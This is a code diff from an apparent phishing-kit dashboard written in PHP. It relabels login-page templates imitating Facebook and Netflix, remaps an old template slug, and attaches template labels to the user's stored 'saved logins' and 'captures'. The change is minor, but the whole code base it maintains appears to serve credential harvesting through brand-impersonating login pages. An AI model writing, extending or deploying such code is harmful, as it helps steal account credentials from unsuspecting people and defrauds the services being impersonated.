@@ -147,9 +147,9 @@ function read_saveinfo_config(string $baseDir): array
 function saveinfo_templates_registry(): array
 {
     return [
-        'facebook' => ['label' => 'Facebook style', 'file' => 'facebook.html'],
-        'netflix' => ['label' => 'Netflix style', 'file' => 'netflix.html'],
-        'simple' => ['label' => 'Simple login', 'file' => 'simple.html'],
+        'facebook' => ['label' => 'Facebook', 'file' => 'facebook.html'],
+        'netflix' => ['label' => 'Netflix', 'file' => 'netflix.html'],
+        'default' => ['label' => 'Default', 'file' => 'default.html'],
     ];
 }
 
@@ -159,6 +159,9 @@ function normalize_saveinfo_template_slug(string $baseDir, $raw): string
     $keys = array_keys($registry);
     $default = $keys[0] ?? 'facebook';
     $v = strtolower(trim((string) $raw));
+    if ($v === 'simple') {
+        return 'default';
+    }
     if ($v !== '' && isset($registry[$v])) {
         return $v;
     }
@@ -2021,10 +2024,27 @@ function handleClearCaptures(): void
     ]);
 }
 
+function saveinfo_saved_login_template_label(string $slug): string
+{
+    if ($slug === 'simple') {
+        return 'Default';
+    }
+    $registry = saveinfo_templates_registry();
+
+    return $registry[$slug]['label'] ?? $slug;
+}
+
 function handleSavedInfo(): void
 {
     $uid = dashboard_session_user_id();
     $entries = trackify_read_saved_logins($uid);
+    foreach ($entries as $i => $row) {
+        if (!is_array($row)) {
+            continue;
+        }
+        $slug = isset($row['template']) ? (string) $row['template'] : '';
+        $entries[$i]['template_label'] = saveinfo_saved_login_template_label($slug);
+    }
 
     echo json_encode([
         'status' => 'success',
